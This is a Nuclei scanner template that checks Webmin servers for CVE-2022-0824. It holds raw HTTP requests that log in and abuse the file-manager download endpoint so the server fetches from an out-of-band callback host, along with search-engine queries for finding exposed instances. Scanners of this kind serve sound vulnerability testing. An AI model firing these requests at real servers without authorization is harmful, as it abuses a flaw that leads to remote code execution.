http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - Failed to write to /{{ranstr}}/index.html
  matchers-condition: and
  raw:
  - 'POST /session_login.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: redirect=1;testing=1;PHPSESSID=;


    user={{username}}&pass={{password}}

    '
  - 'POST /extensions/file-manager/http_download.cgi?module=filemin HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    Referer: {{RootURL}}/filemin/?xnavigation=1


    link=http://{{interactsh-url}}&username=&password=&path=/{{ranstr}}

    '
id: CVE-2022-0824
info:
  author: cckuailong
  classification:
    cpe: cpe:2.3:a:webmin:webmin:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-0824
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-284,CWE-863
    epss-percentile: 0.99863
    epss-score: 0.93877
  description: Webmin before 1.990 is susceptible to improper access control in GitHub
    repository webmin/webmin. This in turn can lead to remote code execution, by which
    an attacker can execute malware, obtain sensitive information, modify data, and/or
    gain full control over a compromised system without entering necessary credentials.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    gain unauthorized access to sensitive information or perform unauthorized actions.

    '
  metadata:
    fofa-query: title="webmin"
    google-query: intitle:"webmin"
    max-request: 2
    product: webmin
    shodan-query: http.title:"webmin"
    vendor: webmin
  name: Webmin <1.990 - Improper Access Control
  reference:
  - https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell/blob/main/Webmin-revshell.py
  - https://github.com/webmin/webmin/commit/39ea464f0c40b325decd6a5bfb7833fa4a142e38
  - https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0824
  - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: 'Upgrade Webmin to version 1.990 or later to mitigate this vulnerability.

    '
  severity: high
  tags: cve,cve2022,rce,oss,huntr,webmin,authenticated,vuln
